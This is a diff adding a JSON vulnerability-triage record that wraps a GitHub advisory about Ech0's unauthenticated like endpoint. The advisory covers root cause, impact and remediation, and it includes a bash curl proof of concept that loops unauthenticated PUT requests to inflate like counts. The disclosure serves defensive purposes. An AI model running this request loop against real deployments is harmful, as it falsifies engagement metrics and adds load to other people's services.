@@ -1,0 +1,55 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/88771533?v=4\", \"events_url\": \"https://api.github.com/users/VashuVats/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/VashuVats/followers\", \"following_url\": \"https://api.github.com/users/VashuVats/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/VashuVats/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/VashuVats\", \"id\": 88771533, \"login\": \"VashuVats\", \"node_id\": \"MDQ6VXNlcjg4NzcxNTMz\", \"organizations_url\": \"https://api.github.com/users/VashuVats/orgs\", \"received_events_url\": \"https://api.github.com/users/VashuVats/received_events\", \"repos_url\": \"https://api.github.com/users/VashuVats/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/VashuVats/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/VashuVats/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/VashuVats\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-306\", \"name\": \"Missing Authentication for Critical Function\"}, {\"cwe_id\": \"CWE-862\", \"name\": \"Missing Authorization\"}], \"description\": \"### Summary\\n\\n**No authentication** is required to invoke **`PUT /api/echo/like/:id`**. The handler is registered on the **public** router group. The service increments **`fav_count`** for the given echo **without** checking identity, **without** a per-user limit, and **without** CSRF tokens. A remote client can **arbitrarily inflate** like metrics with repeated requests.\\n\\n### Description\\n\\n**Root cause:** The like endpoint is explicitly public (`PublicRouterGroup`). `LikeEcho` in the service layer only runs a repository increment inside a transaction—no viewer/user binding.\\n\\n**Security boundary that fails:** **Integrity** of engagement metrics (likes) and any trust that “likes” represent distinct or authenticated users.\\n\\n**Exploitation:** Discover or guess a public echo UUID (timeline, API, share link) → send **unauthenticated** `PUT` repeatedly → **`fav_count`** increases linearly.\\n\\n### Affected files\\n\\n| Public route registration | `internal/router/echo.go` |\\n| Like mutation (no auth check) | `internal/service/echo/echo.go` |\\n| Handler | `internal/handler/echo/echo.go` |\\n\\n### Vulnerable / relevant code\\n\\n**Public PUT route:**\\n\\n```11:13:Ech0/internal/router/echo.go\\n\\t// Public\\n\\tappRouterGroup.PublicRouterGroup.PUT(\\\"/echo/like/:id\\\", h.EchoHandler.LikeEcho())\\n\\tappRouterGroup.PublicRouterGroup.GET(\\\"/tags\\\", h.EchoHandler.GetAllTags())\\n```\\n\\n**Service does not use viewer / rate limit:**\\n\\n```244:248:Ech0/internal/service/echo/echo.go\\nfunc (echoService *EchoService) LikeEcho(ctx context.Context, id string) error {\\n\\treturn echoService.transactor.Run(ctx, func(txCtx context.Context) error {\\n\\t\\treturn echoService.echoRepository.LikeEcho(txCtx, id)\\n\\t})\\n}\\n```\\n\\n### Execution flow\\n\\n1. Client resolves `ECHO_ID` (e.g. `GET /api/echo/page` with any valid token, or from UI).\\n2. Client sends **`PUT /api/echo/like/{ECHO_ID}`** with **no** `Authorization` header.\\n3. Gin matches **public** route → handler → `EchoService.LikeEcho` → DB increments **`fav_count`**.\\n4. Repeat N times → count increases by N.\\n\\n### Proof of concept\\n\\n```bash\\nBASE=\\\"http://127.0.0.1:6277\\\"\\n\\nOWNER_TOKEN=$(curl -sS -X POST \\\"$BASE/api/login\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"username\\\":\\\"owner\\\",\\\"password\\\":\\\"OwnerPass123\\\"}' | jq -r '.data')\\n\\nECHO_ID=$(curl -sS \\\"$BASE/api/echo/page?page=1&page_size=1\\\" \\\\\\n  -H \\\"Authorization: Bearer $OWNER_TOKEN\\\" | jq -r '.data.items[0].id')\\n\\n# Single unauthenticated like\\ncurl -sS -w \\\"\\\\nHTTP:%{http_code}\\\\n\\\" -X PUT \\\"$BASE/api/echo/like/$ECHO_ID\\\"\\n\\n# Inflate (e.g. 55 times); expect HTTP 200 each time\\nfor i in $(seq 1 55); do\\n  curl -sS -o /dev/null -w \\\"%{http_code}\\\\n\\\" -X PUT \\\"$BASE/api/echo/like/$ECHO_ID\\\"\\ndone\\n\\n# Observe fav_count\\ncurl -sS \\\"$BASE/api/echo/$ECHO_ID\\\" | jq '.data | {id, fav_count}'\\n```\\n\\n**Observed proof (manual test):**\\n\\n- Each unauthenticated `PUT` returned **HTTP `200`** with success JSON (e.g. `点赞Echo成功`, `code:1`).\\n- **`fav_count`** increased to **113** , demonstrating **linear inflation from one client** with **no authentication**.\\n<img width=\\\"1109\\\" height=\\\"188\\\" alt=\\\"Screenshot 2026-04-01 105522\\\" src=\\\"https://github.com/user-attachments/assets/a725cf10-d20b-45a1-95bb-2e8ea396c08c\\\" />\\n\\n\\n### Impact\\n\\n**Like counts and ranking/social proof** can be falsified; feeds or “popular” logic tied to `fav_count` are untrustworthy. \\nhigh-volume loops add DB write load; possible abuse against availability at scale. \\n\\n**Attacker capability:** Anyone on the network can manipulate **public** engagement metrics for any known echo id. Combined with permissive **CORS** browsers could automate cross-origin requests.\\n\\n## Remediation \\n Require authentication for likes and enforce **one like per principal**, **or** keep anonymous likes but add **rate limiting**, **proof-of-work / captcha**, or **signed tokens** tied to anon sessions; document that counts are **not** auditor-grade metrics.\", \"ghsa_id\": \"GHSA-rgj7-vg8v-j4wr\", \"github_reviewed_at\": \"2026-05-07T21:21:21Z\", \"html_url\": \"https://github.com/advisories/GHSA-rgj7-vg8v-j4wr\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-rgj7-vg8v-j4wr\"}], \"nvd_published_at\": null, \"published_at\": \"2026-05-07T21:21:21Z\", \"references\": [\"https://github.com/lin-snow/Ech0/security/advisories/GHSA-rgj7-vg8v-j4wr\", \"https://github.com/lin-snow/Ech0/commit/a7e8b8e84bd1e3db090dfb720f2c6c433356b442\", \"https://github.com/advisories/GHSA-rgj7-vg8v-j4wr\"], \"repository_advisory_url\": \"https://api.github.com/repos/lin-snow/Ech0/security-advisories/GHSA-rgj7-vg8v-j4wr\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/lin-snow/Ech0\", \"summary\": \"Ech0's Unauthenticated Like Endpoint Enables Arbitrary Engagement Metric Inflation\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-07T21:21:21Z\", \"url\": \"https://api.github.com/advisories/GHSA-rgj7-vg8v-j4wr\", \"vulnerabilities\": [{\"first_patched_version\": \"1.4.8-0.20260503040728-a7e8b8e84bd1\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/lin-snow/ech0\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.4.8-0.20260503040728-a7e8b8e84bd1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-rgj7-vg8v-j4wr",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/lin-snow/ech0: < 1.4.8-0.20260503040728-a7e8b8e84bd1"
+    ],
+    "authentication_required": false,
+    "cves": [],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/lin-snow/ech0"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:03.493020Z",
+  "provenance": {
+    "content_sha256": "223671170eb5f75a577e8b54b32614f213610f6447036451187f2dd7f90f5567",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-07T21:21:21Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-rgj7-vg8v-j4wr",
+  "status": "active",
+  "title": "Ech0's Unauthenticated Like Endpoint Enables Arbitrary Engagement Metric Inflation",
+  "updated_at": "2026-05-07T21:21:21Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-rgj7-vg8v-j4wr"
+}
